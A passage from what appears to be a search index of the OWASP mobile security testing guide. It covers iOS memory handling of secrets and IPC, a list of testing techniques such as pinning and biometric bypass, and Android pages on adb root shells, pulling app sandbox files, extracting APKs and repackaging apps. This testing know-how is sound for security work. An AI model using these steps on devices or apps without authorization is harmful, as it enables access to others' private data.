issue.</p>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0103/","title":"MASTG-KNOW-0103: Process Memory","text":"<p>Analyzing memory can help developers to identify the root causes of problems such as application crashes. However, it can also be used to access to sensitive data. This section describes how to check process' memory for data disclosure.</p> <p>First, identify the sensitive information that's stored in memory. Sensitive assets are very likely to be loaded into memory at some point. The objective is to make sure that this info is exposed as briefly as possible.</p> <p>To investigate an application's memory, first create a memory dump. Alternatively, you can analyze the memory in real time with, for example, a debugger. Regardless of the method you use, this is a very error-prone process because dumps provide the data left by executed functions and you might miss executing critical steps. In addition, overlooking data during analysis is quite easy to do unless you know the footprint of the data you're looking for (either its exact value or its format). For example, if the app encrypts according to a randomly generated symmetric key, you're very unlikely to spot the key in memory unless you find its value by other means.</p> <p>Before looking into the source code, checking the documentation and identifying application components provide an overview of where data might be exposed. For example, while sensitive data received from a backend exists in the final model object, multiple copies may also exist in the HTTP client or the XML parser. All these copies should be removed from memory as soon as possible.</p> <p>Understanding the application's architecture and its interaction with the OS will help you identify sensitive information that doesn't have to be exposed in memory at all. For example, assume your app receives data from one server and transfers it to another without needing any additional processing. That data can be received and handled in encrypted form, which prevents exposure via memory.</p> <p>However, if sensitive data does need to be exposed via memory, make sure that your app exposes as few copies of this data as possible for as little time as possible. In other words, you want centralized handling of sensitive data, based on primitive and mutable data structures.</p> <p>Such data structures give developers direct access to memory. Make sure that this access is used to overwrite the sensitive data and cryptographic keys with zeroes. Apple Secure Coding Guide suggests zeroing sensitive data after usage, but provides no recommended ways of doing this.</p> <p>Examples of preferable data types include <code>char []</code> and <code>int []</code>, but not <code>NSString</code> or <code>String</code>. Whenever you try to modify an immutable object, such as a <code>String</code>, you actually create a copy and change the copy. Consider using <code>NSMutableData</code> for storing secrets on Swift/Objective-C and use <code>resetBytes(in:)</code> method for zeroing. Also, see Clean memory of secret data for reference.</p> <p>Avoid Swift data types other than collections regardless of whether they are considered mutable. Many Swift data types hold their data by value, not by reference. Although this allows modification of the memory allocated to simple types like <code>char</code> and <code>int</code>, handling a complex type such as <code>String</code> by value involves a hidden layer of objects, structures, or primitive arrays whose memory can't be directly accessed or modified. Certain types of usage may seem to create a mutable data object (and even be documented as doing so), but they actually create a mutable identifier (variable) instead of an immutable identifier (constant). For example, many think that the following results in a mutable <code>String</code> in Swift, but this is actually an example of a variable whose complex value can be changed (replaced, not modified in place):</p> <pre><code>var str1 = \"Goodbye\"              // \"Goodbye\", base address:            0x0001039e8dd0\nstr1.append(\" \")                 // \"Goodbye \", base address:            0x608000064ae0\nstr1.append(\"cruel world!\")      // \"Goodbye cruel world\", base address: 0x6080000338a0\nstr1.removeAll()                 // \"\", base address                    0x00010bd66180\n</code></pre> <p>Notice that the base address of the underlying value changes with each string operation. Here is the problem: To securely erase the sensitive information from memory, we don't want to simply change the value of the variable; we want to change the actual content of the memory allocated for the current value. Swift doesn't offer such a function.</p> <p>Swift collections (<code>Array</code>, <code>Set</code>, and <code>Dictionary</code>), on the other hand, may be acceptable if they collect primitive data types such as <code>char</code> or <code>int</code> and are defined as mutable (i.e., as variables instead of constants), in which case they are more or less equivalent to a primitive array (such as <code>char []</code>). These collections provide memory management, which can result in unidentified copies of the sensitive data in memory if the collection needs to copy the underlying buffer to a different location to extend it.</p> <p>Using mutable Objective-C data types, such as <code>NSMutableString</code>, may also be acceptable, but these types have the same memory issue as Swift collections. Pay attention when using Objective-C collections; they hold data by reference, and only Objective-C data types are allowed. Therefore, we are looking, not for a mutable collection, but for a collection that references mutable objects.</p> <p>As we've seen so far, using Swift or Objective-C data types requires a deep understanding of the language implementation. Furthermore, there has been some core re-factoring in between major Swift versions, resulting in many data types' behavior being incompatible with that of other types. To avoid these issues, we recommend using primitive data types whenever data needs to be securely erased from memory.</p> <p>Unfortunately, few libraries and frameworks are designed to allow sensitive data to be overwritten. Not even Apple considers this issue in the official iOS SDK API. For example, most of the APIs for data transformation (passers, serializes, etc.) operate on non-primitive data types. Similarly, regardless of whether you flag some <code>UITextField</code> as Secure Text Entry or not, it always returns data in the form of a <code>String</code> or <code>NSString</code>.</p>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/knowledge/ios/MASVS-STORAGE/MASTG-KNOW-0104/","title":"MASTG-KNOW-0104: Inter-Process Communication (IPC) Mechanisms","text":"<p>Inter Process Communication (IPC) allows processes to send each other messages and data. For processes that need to communicate with each other, there are different ways to implement IPC on iOS:</p> <ul> <li>XPC Services: XPC is a structured, asynchronous library that provides basic interprocess communication. It is managed by <code>launchd</code>. It is the most secure and flexible implementation of IPC on iOS and should be the preferred method. It runs in the most restricted environment possible: sandboxed with no root privilege escalation and minimal file system access and network access. Two different APIs are used with XPC Services:<ul> <li>NSXPCConnection API</li> <li>XPC Services API</li> </ul> </li> <li>Mach Ports: All IPC communication ultimately relies on the Mach Kernel API. Mach Ports allow local communication (intra-device communication) only. They can be implemented either natively or via Core Foundation (CFMachPort) and Foundation (NSMachPort) wrappers.</li> <li>NSFileCoordinator: The class <code>NSFileCoordinator</code> can be used to manage and send data to and from apps via files that are available on the local file system to various processes. NSFileCoordinator methods run synchronously, so your code will be blocked until they stop executing. That's convenient because you don't have to wait for an asynchronous block callback, but it also means that the methods block the running thread.</li> </ul>","tags":["ios","MASVS-STORAGE","know"]},{"location":"MASTG/techniques/","title":"Mobile Security Testing Techniques","text":"ID Name Platform MASTG-TECH-0015  Dynamic Analysis on Android platform:android MASTG-TECH-0117  Obtaining Information from the AndroidManifest platform:android MASTG-TECH-0042  Getting Loaded Classes and Methods Dynamically platform:android MASTG-TECH-0041  Library Injection platform:android MASTG-TECH-0025  Automated Static Analysis platform:android MASTG-TECH-0039  Repackaging &amp; Re-Signing platform:android MASTG-TECH-0037  Symbolic Execution platform:android MASTG-TECH-0126  Obtaining App Permissions platform:android MASTG-TECH-0026  Dynamic Analysis on Non-Rooted Devices platform:android MASTG-TECH-0129  Verifying Android Dependencies at Runtime platform:android MASTG-TECH-0017  Decompiling Java Code platform:android MASTG-TECH-0130  Software Composition Analysis (SCA) of Android Dependencies by Creating a SBOM platform:android MASTG-TECH-0109  Intercepting Flutter HTTPS Traffic platform:android MASTG-TECH-0045  Runtime Reverse Engineering platform:android MASTG-TECH-0022  Information Gathering - Network Communication platform:android MASTG-TECH-0021  Information Gathering - API Usage platform:android MASTG-TECH-0115  Obtaining Compiler-Provided Security Features platform:android MASTG-TECH-0001  Accessing the Device Shell platform:android MASTG-TECH-0116  Obtaining Information about the APK Signature platform:android MASTG-TECH-0018  Disassembling Native Code platform:android MASTG-TECH-0034  Native Code Tracing platform:android MASTG-TECH-0044  Process Exploration platform:android MASTG-TECH-0035  JNI Tracing platform:android MASTG-TECH-0011  Setting Up an Interception Proxy platform:android MASTG-TECH-0030  Sandbox Inspection platform:android MASTG-TECH-0131  Software Composition Analysis (SCA) of Android Dependencies at Build Time platform:android MASTG-TECH-0008  Accessing App Data Directories platform:android MASTG-TECH-0003  Obtaining and Extracting Apps platform:android MASTG-TECH-0043  Method Hooking platform:android MASTG-TECH-0108  Taint Analysis platform:android MASTG-TECH-0112  Reverse Engineering Flutter Applications platform:android MASTG-TECH-0006  Listing Installed Apps platform:android MASTG-TECH-0019  Retrieving Strings platform:android MASTG-TECH-0038  Patching platform:android MASTG-TECH-0002  Host-Device Data Transfer platform:android MASTG-TECH-0128  Performing a Backup and Restore of App Data platform:android MASTG-TECH-0127  Inspecting an App's Backup Data platform:android MASTG-TECH-0033  Method Tracing platform:android MASTG-TECH-0010  Basic Network Monitoring/Sniffing platform:android MASTG-TECH-0009  Monitoring System Logs platform:android MASTG-TECH-0012  Bypassing Certificate Pinning platform:android MASTG-TECH-0014  Static Analysis on Android platform:android MASTG-TECH-0004  Repackaging Apps platform:android MASTG-TECH-0031  Debugging platform:android MASTG-TECH-0016  Disassembling Code to Smali platform:android MASTG-TECH-0027  Get Open Files platform:android MASTG-TECH-0040  Waiting for the Debugger platform:android MASTG-TECH-0013  Reverse Engineering Android Apps platform:android MASTG-TECH-0100  Logging Sensitive Data from Network Traffic platform:android MASTG-TECH-0032  Execution Tracing platform:android MASTG-TECH-0028  Get Open Connections platform:android MASTG-TECH-0023  Reviewing Decompiled Java Code platform:android MASTG-TECH-0007  Exploring the App Package platform:android MASTG-TECH-0024  Reviewing Disassembled Native Code platform:android MASTG-TECH-0020  Retrieving Cross References platform:android MASTG-TECH-0029  Get Loaded Native Libraries platform:android MASTG-TECH-0036  Emulation-based Analysis platform:android MASTG-TECH-0005  Installing Apps platform:android MASTG-TECH-0048  Static Analysis platform:generic MASTG-TECH-0120  Intercepting HTTP Traffic Using an Interception Proxy platform:generic MASTG-TECH-0049  Dynamic Analysis platform:generic MASTG-TECH-0051  Tampering and Runtime Instrumentation platform:generic MASTG-TECH-0122  Passive Eavesdropping platform:generic MASTG-TECH-0050  Binary Analysis platform:generic MASTG-TECH-0125  Intercepting Xamarin Traffic platform:generic MASTG-TECH-0119  Intercepting HTTP Traffic by Hooking Network APIs at the Application Layer platform:generic MASTG-TECH-0123  Achieving a MITM Position via ARP Spoofing platform:generic MASTG-TECH-0047  Reverse Engineering platform:generic MASTG-TECH-0121  Intercepting Non-HTTP Traffic Using an Interception Proxy platform:generic MASTG-TECH-0124  Achieving a MITM Position Using a Rogue Access Point platform:generic MASTG-TECH-0064  Bypassing Certificate Pinning platform:ios MASTG-TECH-0068  Disassembling Native Code platform:ios MASTG-TECH-0077  Reviewing Disassembled Native Code platform:ios MASTG-TECH-0118  Obtaining Compiler-Provided Security Features platform:ios MASTG-TECH-0067  Dynamic Analysis on iOS platform:ios MASTG-TECH-0052  Accessing the Device Shell platform:ios MASTG-TECH-0110  Intercepting Flutter HTTPS Traffic platform:ios MASTG-TECH-0094  Getting Loaded Classes and Methods dynamically platform:ios MASTG-TECH-0078  Automated Static Analysis platform:ios MASTG-TECH-0111  Extracting Entitlements from MachO Binaries platform:ios MASTG-TECH-0091  Injecting Libraries into an IPA Manually platform:ios MASTG-TECH-0072  Retrieving Cross References platform:ios MASTG-TECH-0090  Injecting Frida Gadget into an IPA Automatically platform:ios MASTG-TECH-0081  Get Open Connections platform:ios MASTG-TECH-0058  Exploring the App Package platform:ios MASTG-TECH-0061  Dumping KeyChain Data platform:ios MASTG-TECH-0097  Runtime Reverse Engineering platform:ios MASTG-TECH-0093  Waiting for the debugger platform:ios MASTG-TECH-0079  Obtaining a Developer Provisioning Profile platform:ios MASTG-TECH-0138  Convert Plist Files to JSON platform:ios MASTG-TECH-0084  Debugging platform:ios MASTG-TECH-0073  Information Gathering - API Usage platform:ios MASTG-TECH-0053  Host-Device Data Transfer platform:ios MASTG-TECH-0082  Get Shared Libraries platform:ios MASTG-TECH-0114  Demangling Symbols platform:ios MASTG-TECH-0056  Installing Apps platform:ios MASTG-TECH-0096  Process Exploration platform:ios MASTG-TECH-0083  Sandbox Inspection platform:ios MASTG-TECH-0063  Setting up an Interception Proxy platform:ios MASTG-TECH-0071  Retrieving Strings platform:ios MASTG-TECH-0095  Method Hooking platform:ios MASTG-TECH-0074  Information Gathering - Network Communication platform:ios MASTG-TECH-0069  Decompiling Native Code platform:ios MASTG-TECH-0139  Attach to WKWebView platform:unknown MASTG-TECH-0065  Reverse Engineering iOS Apps platform:ios MASTG-TECH-0060  Monitoring System Logs platform:ios MASTG-TECH-0135  Bypassing Biometric Authentication platform:ios MASTG-TECH-0075  Reviewing Decompiled Objective-C and Swift Code platform:ios MASTG-TECH-0062  Basic Network Monitoring/Sniffing platform:ios MASTG-TECH-0057  Listing Installed Apps platform:ios MASTG-TECH-0112  Reverse Engineering Flutter Applications platform:ios MASTG-TECH-0133  Software Composition Analysis (SCA) of iOS Dependencies by Scanning Package Manager Artifacts platform:ios MASTG-TECH-0137  Analyzing PrivacyInfo.xcprivacy Files platform:ios MASTG-TECH-0070  Extracting Information from the Application Binary platform:ios MASTG-TECH-0076  Reviewing Disassembled Objective-C and Swift Code platform:ios MASTG-TECH-0059  Accessing App Data Directories platform:ios MASTG-TECH-0134  Monitoring the Pasteboard platform:ios MASTG-TECH-0086  Method Tracing platform:ios MASTG-TECH-0113  Obtaining Debugging Symbols platform:ios MASTG-TECH-0085  Execution Tracing platform:ios MASTG-TECH-0088  Emulation-based Analysis platform:ios MASTG-TECH-0054  Obtaining and Extracting Apps platform:ios MASTG-TECH-0089  Symbolic Execution platform:ios MASTG-TECH-0066  Static Analysis on iOS platform:ios MASTG-TECH-0087  Native Code Tracing platform:ios MASTG-TECH-0092  Signing IPA files platform:ios MASTG-TECH-0080  Get Open Files platform:ios MASTG-TECH-0098  Patching React Native Apps platform:ios MASTG-TECH-0055  Launching a Repackaged App in Debug Mode platform:ios MASTG-TECH-0136  Retrieving PrivacyInfo.xcprivacy Files platform:ios MASTG-TECH-0132  Software Composition Analysis (SCA) of iOS Dependencies by Creating a SBOM platform:ios","tags":[]},{"location":"MASTG/techniques/android/MASTG-TECH-0001/","title":"MASTG-TECH-0001: Accessing the Device Shell","text":"<p>One of the most common things you do when testing an app is accessing the device shell. In this section we'll see how to access the Android shell both remotely from your host computer with/without a USB cable and locally from the device itself.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0001/#remote-shell","title":"Remote Shell","text":"<p>In order to connect to the shell of an Android device from your host computer,  adb is usually your tool of choice (unless you prefer to use remote SSH access, e.g. via Termux).</p> <p>For this section we assume that you've properly enabled Developer Mode and USB debugging as explained in \"Testing on a Real Device\". Once you've connected your Android device via USB, you can access the remote device's shell by running:</p> <pre><code>adb shell\n</code></pre> <p>press Control + D or type <code>exit</code> to quit</p> <p>Once in the remote shell, if your device is rooted or you're using the emulator, you can get root access by running <code>su</code>:</p> <pre><code>bullhead:/ $ su\nbullhead:/ # id\nuid=0(root) gid=0(root) groups=0(root) context=u:r:su:s0\n</code></pre> <p>Only if you're working with an emulator you may alternatively restart adb with root permissions with the command <code>adb root</code> so next time you enter <code>adb shell</code> you'll have root access already. This also allows to transfer data bidirectionally between your host computer and the Android file system, even with access to locations where only the root user has access to (via <code>adb push/pull</code>). See more about data transfer in  Host-Device Data Transfer below.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0001/#connect-to-multiple-devices","title":"Connect to Multiple Devices","text":"<p>If you have more than one device, remember to include the <code>-s</code> flag followed by the device serial ID on all your <code>adb</code> commands (e.g. <code>adb -s emulator-5554 shell</code> or <code>adb -s 00b604081540b7c6 shell</code>). You can get a list of all connected devices and their serial IDs by using the following command:</p> <pre><code>adb devices\nList of devices attached\n00c907098530a82c    device\nemulator-5554    device\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0001/#connect-to-a-device-over-wi-fi","title":"Connect to a Device over Wi-Fi","text":"<p>You can also access your Android device without using the USB cable. For this you'll have to connect both your host computer and your Android device to the same Wi-Fi network and follow the next steps:</p> <ul> <li>Connect the device to the host computer with a USB cable and set the target device to listen for a TCP/IP connection on port 5555: <code>adb tcpip 5555</code>.</li> <li>Disconnect the USB cable from the target device and run <code>adb connect &lt;device_ip_address&gt;</code>. Check that the device is now available by running <code>adb devices</code>.</li> <li>Open the shell with <code>adb shell</code>.</li> </ul> <p>However, notice that by doing this you leave your device open to anyone being in the same network and knowing the IP address of your device. You may rather prefer using the USB connection.</p> <p>For example, on a Nexus device, you can find the IP address at Settings -&gt; System -&gt; About phone -&gt; Status -&gt; IP address or by going to the Wi-Fi menu and tapping once on the network you're connected to.</p> <p>See the full instructions and considerations in the Android Developers Documentation.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0001/#connect-to-a-device-via-ssh","title":"Connect to a Device via SSH","text":"<p>If you prefer, you can also enable SSH access. A convenient option is to use  Termux, which you can easily configure to offer SSH access (with password or public key authentication) and start it with the command <code>sshd</code> (starts by default on port 8022). In order to connect to the Termux via SSH you can simply run the command <code>ssh -p 8022 &lt;ip_address&gt;</code> (where <code>ip_address</code> is the actual remote device IP). This option has some additional benefits as it allows to access the file system via SFTP also on port 8022.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0001/#on-device-shell-app","title":"On-device Shell App","text":"<p>While usually using an on-device shell (terminal emulator) such as  Termux might be very tedious compared to a remote shell, it can prove handy for debugging in case of, for example, network issues or to check some configuration.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0002/","title":"MASTG-TECH-0002: Host-Device Data Transfer","text":"","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0002/#using-adb","title":"Using adb","text":"<p>You can copy files to and from a device by using the  adb commands <code>adb pull &lt;remote&gt; &lt;local&gt;</code> and <code>adb push &lt;local&gt; &lt;remote&gt;</code> commands. Their usage is very straightforward. For example, the following will copy <code>foo.txt</code> from your current directory (local) to the <code>sdcard</code> folder (remote):</p> <pre><code>adb push foo.txt /sdcard/foo.txt\n</code></pre> <p>This approach is commonly used when you know exactly what you want to copy and from/to where and also supports bulk file transfer, e.g. you can pull (copy) a whole directory from the Android device to your host computer.</p> <pre><code>$ adb pull /sdcard\n/sdcard/: 1190 files pulled. 14.1 MB/s (304526427 bytes in 20.566s)\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0002/#using-android-studio-device-file-explorer","title":"Using Android Studio Device File Explorer","text":"<p>Android Studio has a built-in Device File Explorer which you can open by going to View -&gt; Tool Windows -&gt; Device File Explorer.</p> <p></p> <p>If you're using a rooted device you can now start exploring the whole file system. However, when using a non-rooted device accessing the app sandboxes won't work unless the app is debuggable and even then you are \"jailed\" within the app sandbox.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0002/#using-objection","title":"Using objection","text":"<p>This option is useful when you are working on a specific app and want to copy files you might encounter inside its sandbox (notice that you'll only have access to the files that the target app has access to). This approach works without having to set the app as debuggable, which is otherwise required when using Android Studio's Device File Explorer.</p> <p>First, connect to the app with Objection as explained in  objection. Then, use <code>ls</code> and <code>cd</code> as you normally would on your terminal to explore the available files:</p> <pre><code>$ frida-ps -U | grep -i owasp\n21228  sg.vp.owasp_mobile.omtg_android\n\n$ objection -g sg.vp.owasp_mobile.omtg_android explore\n\n...g.vp.owasp_mobile.omtg_android on (google: 8.1.0) [usb] # cd ..\n/data/user/0/sg.vp.owasp_mobile.omtg_android\n\n...g.vp.owasp_mobile.omtg_android on (google: 8.1.0)  [usb] # ls\nType       ...  Name\n---------  ...  -------------------\nDirectory  ...  cache\nDirectory  ...  code_cache\nDirectory  ...  lib\nDirectory  ...  shared_prefs\nDirectory  ...  files\nDirectory  ...  app_ACRA-approved\nDirectory  ...  app_ACRA-unapproved\nDirectory  ...  databases\n\nReadable: True  Writable: True\n</code></pre> <p>One you have a file you want to download you can just run <code>file download &lt;some_file&gt;</code>. This will download that file to your working directory. The same way you can upload files using <code>file upload</code>.</p> <pre><code>...[usb] # ls\nType    ...  Name\n------  ...  -----------------------------------------------\nFile    ...  sg.vp.owasp_mobile.omtg_android_preferences.xml\n\nReadable: True  Writable: True\n...[usb] # file download sg.vp.owasp_mobile.omtg_android_preferences.xml\nDownloading ...\nStreaming file from device...\nWriting bytes to destination...\nSuccessfully downloaded ... to sg.vp.owasp_mobile.omtg_android_preferences.xml\n</code></pre> <p>The downside is that, at the time of this writing, objection does not support bulk file transfer yet, so you're restricted to copy individual files. Still, this can come handy in some scenarios where you're already exploring the app using objection anyway and find some interesting file. Instead of for example taking note of the full path of that file and use <code>adb pull &lt;path_to_some_file&gt;</code> from a separate terminal, you might just want to directly do <code>file download &lt;some_file&gt;</code>.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0003/","title":"MASTG-TECH-0003: Obtaining and Extracting Apps","text":"<p>There are several ways of extracting APK files from a device. You will need to decide which one is the easiest method depending if the app is public or private.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0003/#alternative-app-stores","title":"Alternative App Stores","text":"<p>One of the easiest options is to download the APK from websites that mirror public applications from the Google Play Store. However, keep in mind that these sites are not official and there is no guarantee that the application hasn't been repackaged or contain malware. A few reputable websites that host APKs and are not known for modifying apps and even list SHA-1 and SHA-256 checksums of the apps are:</p> <ul> <li>APKMirror</li> <li>APKPure</li> </ul> <p>Beware that you do not have control over these sites and you cannot guarantee what they do in the future. Only use them if it's your only option left.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0003/#using-gplaycli","title":"Using gplaycli","text":"<p>You can use  gplaycli to download (<code>-d</code>) the selected APK by specifying its AppID (add <code>-p</code> to show a progress bar and <code>-v</code> for verbosity):</p> <pre><code>$ gplaycli -p -v -d com.google.android.keep\n[INFO] GPlayCli version 3.26 [Python3.7.4]\n[INFO] Configuration file is ~/.config/gplaycli/gplaycli.conf\n[INFO] Device is bacon\n[INFO] Using cached token.\n[INFO] Using auto retrieved token to connect to API\n[INFO] 1 / 1 com.google.android.keep\n[################################] 15.78MB/15.78MB - 00:00:02 6.57MB/s/s\n[INFO] Download complete\n</code></pre> <p>The <code>com.google.android.keep.apk</code> file will be in your current directory. As you might imagine, this approach is a very convenient way to download APKs, especially with regards to automation.</p> <p>You may use your own Google Play credentials or token. By default, gplaycli will use an internally provided token.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0003/#extracting-the-app-package-from-the-device","title":"Extracting the App Package from the Device","text":"<p>Obtaining app packages from the device is the recommended method as we can guarantee the app hasn't been modified by a third-party. To obtain applications from a rooted or non-rooted device, you can use the following methods:</p> <p>Use <code>adb pull</code> to retrieve the APK. If you don't know the package name, the first step is to list all the applications installed on the device:</p> <pre><code>adb shell pm list packages\n</code></pre> <p>Once you have located the package name of the application, you need the full path where it is stored on the system to download it.</p> <pre><code>adb shell pm path &lt;package name&gt;\n</code></pre> <p>With the full path to the APK, you can now simply use <code>adb pull</code> to extract it.</p> <pre><code>adb pull &lt;apk path&gt;\n</code></pre> <p>The APK will be downloaded in your working directory.</p> <p>Alternatively, there are also apps like APK Extractor that do not require root and can even share the extracted APK via your preferred method. This can be useful if you don't feel like connecting the device or setting up adb over the network to transfer the file.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0003/#testing-instant-apps","title":"Testing Instant Apps","text":"<p>With Google Play Instant you can create Instant apps which can be instantly launched from a browser or the \"try now\" button from the app store from Android 5.0 (API level 21) onward. They do not require any form of installation. There are a few challenges with an instant app:</p> <ul> <li>There is a limited amount of size you can have with an instant app.</li> <li>Only a reduced number of permissions can be used, which are documented at Android Instant app documentation.</li> </ul> <p>The combination of these can lead to insecure decisions, such as: stripping too much of the authorization/authentication/confidentiality logic from an app, which allows for information leakage.</p> <p>Note: Instant apps require an App Bundle. App Bundles are described in the \"App Bundles\" section of the \"Android Platform Overview\" chapter.</p> <p>Static Analysis Considerations:</p> <p>Static analysis can be either done after reverse engineering a downloaded instant app, or by analyzing the App Bundle. When you analyze the App Bundle, check the Android Manifest to see whether <code>dist:module dist:instant=\"true\"</code> is set for a given module (either the base or a specific module with <code>dist:module</code> set). Next, check for the various entry points, which entry points are set (by means of <code>&lt;data android:path=\"&lt;/PATH/HERE&gt;\" /&gt;</code>).</p> <p>Now follow the entry points, like you would do for any Activity and check:</p> <ul> <li>Is there any data retrieved by the app which should require privacy protection of that data? If so, are all required controls in place?</li> <li>Are all communications secured?</li> <li>When you need more functionalities, are the right security controls downloaded as well?</li> </ul> <p>Dynamic Analysis Considerations:</p> <p>There are multiple ways to start the dynamic analysis of your instant app. In all cases, you will first have to install the support for instant apps and add the <code>ia</code> executable to your <code>$PATH</code>.</p> <p>The installation of instant app support is taken care off through the following command:</p> <pre><code>cd path/to/android/sdk/tools/bin &amp;&amp; ./sdkmanager 'extras;google;instantapps'\n</code></pre> <p>Next, you have to add <code>path/to/android/sdk/extras/google/instantapps/ia</code> to your <code>$PATH</code>.</p> <p>After the preparation, you can test instant apps locally on a device running Android 8.1 (API level 27) or later. The app can be tested in different ways:</p> <ul> <li>Test the app locally:   Deploy the app via Android Studio (and enable the <code>Deploy as instant app</code> checkbox in the Run/Configuration dialog) or deploy the app using the following command:</li> </ul> <pre><code>ia run output-from-build-command &lt;app-artifact&gt;\n</code></pre> <ul> <li>Test the app using the Play Console:</li> <li>Upload your App Bundle to the Google Play Console</li> <li>Prepare the uploaded bundle for a release to the internal test track.</li> <li>Sign into an internal tester account on a device, then launch your instant experience from either an external prepared link or via the <code>try now</code> button in the App store from the testers account.</li> </ul> <p>Now that you can test the app, check whether:</p> <ul> <li>There are any data which require privacy controls and whether these controls are in place.</li> <li>All communications are sufficiently secured.</li> <li>When you need more functionalities, are the right security controls downloaded as well for these functionalities?</li> </ul>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0004/","title":"MASTG-TECH-0004: Repackaging Apps","text":"<p>If you need to test on a non-jailbroken device you should learn how to repackage an app to enable dynamic testing on it.</p> <p>Use a computer to perform all the steps indicated in the article \"Patching Android Applications\" from the objection Wiki. Once you're done you'll be able to patch an APK by calling the objection command:</p> <pre><code>objection patchapk --source app-release.apk\n</code></pre> <p>The patched application then needs to be installed using adb.</p> <p>This repackaging method is enough for most use cases. For more advanced repackaging, refer to  Repackaging &amp; Re-Signing.</p>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0005/","title":"MASTG-TECH-0005: Installing Apps","text":"","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0005/#basic-apk-installation","title":"Basic APK Installation","text":"<p>Use <code>adb install</code> to install an APK on an emulator or connected device. The given path is the path of the APK on the host.</p> <pre><code>adb install ./myApp.apk\n</code></pre> <p>If multiple devices are connected, you can specify to install to a connected device (<code>-d</code>), emulator or TCP/IP device (<code>-e</code>) or specific serial number (<code>-s</code>).</p> <pre><code># Install to connected physical device\nadb -d install ./myApp.apk\n\n# Install to emulator\nadb -e install ./myApp.apk\n\n# List all devices\nadb devices\nList of devices attached\n37081JEHN05882  device\nemulator-5554   device\n\n# Connect to a specific device\nadb -s 37081JEHN05882 install ./myApp.apk\n</code></pre> <p>When installing an app, it also possible to automatically grant all runtime permissions using <code>-g</code>:</p> <pre><code>adb install -g ./myApp.apk\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0005/#installing-a-repackaged-app","title":"Installing a Repackaged App","text":"<p>In case there is already an application installed with the same package name, Android will compare the signatures. If the signatures match, the update will succeed. If the signature is different (for example, after repackaging an APK), the installation will fail.</p> <pre><code>adb install ./myRepackagedApp.apk\nadb: failed to install myRepackagedApp.apk: Failure [INSTALL_FAILED_UPDATE_INCOMPATIBLE: Existing package org.owasp.mastestapp signatures do not match newer version; ignoring!]\n</code></pre> <p>To solve this issue, first remove the original application using <code>adb uninstall</code>:</p> <pre><code># Uninstall based on package name\nadb uninstall org.owasp.mastestapp\n\n# Normal install via adb\nadb install ./myRepackagedApp.apk\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0005/#installing-to-a-specific-profile","title":"Installing to a Specific Profile","text":"<p>To install an APK into a specific profile, the APK first has to be pushed to the device, as it is not possible to do this directly using <code>adb install</code>. Note that pushing to <code>/sdcard/</code> may result in permission issues, so use <code>/data/local/tmp</code> to be sure. After pushing the APK to the device, it can be installed using <code>pm install</code> with the <code>--user XX</code> option:</p> <pre><code># Get an overview of available profiles\nadb shell pm list users\nUsers:\n    UserInfo{0:Owner:c13} running\n    UserInfo{11:Sample Managed Profile:1030} running\n\n# Push to /data/local/tmp/\nadb push ./myApp.apk /data/local/tmp/\n\n# Install with pm install and the --user option\nadb shell pm install --user 11 /data/local/tmp/myRepackagedApp.apk\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0005/#installing-split-apks","title":"Installing Split APKs","text":"<p>In case you need to install split APKs, you can use the <code>install-multiple</code> command. Make sure the different split APKs match your device configuration:</p> <pre><code># Youtube is a split APK\nadb shell pm path com.google.android.youtube\npackage:/data/app/~~ZLX3UNTF7R2oebU_viP7mw==/com.google.android.youtube-Rhm4GURIQ4twNvR6wxqc6w==/base.apk\npackage:/data/app/~~ZLX3UNTF7R2oebU_viP7mw==/com.google.android.youtube-Rhm4GURIQ4twNvR6wxqc6w==/split_config.arm64_v8a.apk\npackage:/data/app/~~ZLX3UNTF7R2oebU_viP7mw==/com.google.android.youtube-Rhm4GURIQ4twNvR6wxqc6w==/split_config.en.apk\npackage:/data/app/~~ZLX3UNTF7R2oebU_viP7mw==/com.google.android.youtube-Rhm4GURIQ4twNvR6wxqc6w==/split_config.xxhdpi.apk\n\n# Obtain the different parts\nadb pull /data/app/~~ZLX3UNTF7R2oebU_viP7mw==/com.google.android.youtube-Rhm4GURIQ4twNvR6wxqc6w==/base.apk\nadb pull /data/app/~~ZLX3UNTF7R2oebU_viP7mw==/com.google.android.youtube-Rhm4GURIQ4twNvR6wxqc6w==/split_config.arm64_v8a.apk\nadb pull /data/app/~~ZLX3UNTF7R2oebU_viP7mw==/com.google.android.youtube-Rhm4GURIQ4twNvR6wxqc6w==/split_config.en.apk\nadb pull /data/app/~~ZLX3UNTF7R2oebU_viP7mw==/com.google.android.youtube-Rhm4GURIQ4twNvR6wxqc6w==/split_config.xxhdpi.apk\n\n# Uninstall Youtube as a test\nadb uninstall com.google.android.youtube\n\n# Install the split APK files\nadb install-multiple base.apk split_config.arm64_v8a.apk split_config.en.apk split_config.xxhdpi.apk\n</code></pre>","tags":["android","tech"]},{"location":"MASTG/techniques/android/MASTG-TECH-0006/","title":"MASTG-TECH-0006: Listing Installed 